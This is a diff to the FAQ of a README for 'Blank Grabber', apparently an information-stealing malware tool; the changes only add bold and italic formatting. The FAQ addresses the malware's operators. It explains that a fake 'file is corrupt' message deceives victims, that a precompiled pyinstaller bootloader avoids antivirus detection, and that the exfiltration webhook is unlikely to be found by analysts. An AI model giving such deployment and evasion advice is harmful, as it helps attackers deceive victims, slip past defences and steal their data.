@@ -19,20 +19,20 @@
 
 ## Frequently Asked Questions
 
-1) It says file is corrupt, is it really?
-- It is a message to make the victim think that the file is really corrupt. It will actually work!
+**1) It says file is corrupt, is it really?**
+- *It is a message to make the victim think that the file is really corrupt. It will actually work!*
 
-2) Why is there a pyinstaller library given when we can install one ourself?
-- This pyinstaller library has compiled bootloader so it will not raise suspicions of antiviruses.
+**2) Why is there a pyinstaller library given when we can install one ourself?**
+- *This pyinstaller library has compiled bootloader so it will not raise suspicions of antiviruses.*
 
-3) What should be the approximate file size after compiling?
-- The approximate file size would be around 9.5 MB. Make sure you are using virtual env which otherwise the file may  become too large.
+**3) What should be the approximate file size after compiling?**
+- *The approximate file size would be around 9.5 MB. Make sure you are using virtual env which otherwise the file may  become too large.*
 
-4) How can I change the icon?
-- You can replace the "icon.ico" file in the "Data" folder with your icon but name and format (.ico) must be the same.
+**4) How can I change the icon?**
+- *You can replace the "icon.ico" file in the "Data" folder with your icon but name and format (.ico) must be the same.*
 
-5) Can my webhook get leaked?
-- If the "virus hunter" is not familiar with Blank Grabber, there is a very less chance that your webhook is going to be found.
+**5) Can my webhook get leaked?**
+- *If the "virus hunter" is not familiar with Blank Grabber, there is a very less chance that your webhook is going to be found.*
 
-6) How can I support the development?
-- You can star the repository and make YouTube videos about this grabber (you must include the link to the [original repository](https://github.com/Blank-c/Blank-Grabber)). But you are not allowed to name this grabber as your own creation.
+**6) How can I support the development?**
+- *You can star the repository and make YouTube videos about this grabber (you must include the link to the [original repository](https://github.com/Blank-c/Blank-Grabber)). But you are not allowed to name this grabber as your own creation.*
